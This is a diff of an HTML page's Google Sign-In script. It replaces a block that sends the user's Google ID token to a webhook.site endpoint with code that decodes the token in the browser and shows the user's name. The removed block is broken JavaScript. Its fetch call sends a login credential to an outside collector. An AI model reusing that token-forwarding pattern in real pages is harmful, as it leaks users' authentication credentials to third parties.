@@ -26,43 +26,29 @@
     <div id="token">No token yet.</div>
   </div>
 
-  <script>
-    // Replace the placeholder with your actual Google Client ID
-    // Example: const CLIENT_ID = '12345-abcde.apps.googleusercontent.com';
-   const CLIENT_ID = '588066206740-50feus2h2qk27mk3264sq54oartfkkgf.apps.googleusercontent.com';
-    console.log('Sending token to webhook...');
+<script>
+  // Handle Google Sign-In response directly in browser
+  function handleCredentialResponse(response) {
+    const base64Url = response.credential.split('.')[1];
+    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+    const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
 
-    fetch('https://webhook.site/cffbf94f-68ae-4b8b-9a3e-89e9196f5879', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ token: response.credential })
-    })
-    .then(res => {
-        const tokenDiv = document.getElementById('token');
-        if (tokenDiv) {
-            tokenDiv.textContent = 'Token sent to Webhook.site successfully!';
-        }
-    })
-    .catch(err => {
-        console.error('Error sending token:', err);
+    const user = JSON.parse(jsonPayload);
+    document.getElementById('token').innerText = "Logged in as: " + user.name;
+  }
+
+  window.onload = function () {
+    google.accounts.id.initialize({
+      client_id: "588066206740-50feus2h2qk27mk3264sq54oartfkkgf.apps.googleusercontent.com",
+      callback: handleCredentialResponse
     });
-}
-     
-      google.accounts.id.initialize({
-        client_id: CLIENT_ID,
-        callback: handleCredentialResponse
-      });
-
-      google.accounts.id.renderButton(
-        document.getElementById('buttonDiv'),
-        { theme: 'outline', size: 'large', width: 260 }
-      );
-
-      // Optional: show the One Tap prompt
-      // google.accounts.id.prompt();
-    ;
-  </script>
+    google.accounts.id.renderButton(
+      document.getElementById("buttonDiv"),
+      { theme: "outline", size: "large" }
+    );
+  }
+</script>
 </body>
 </html>
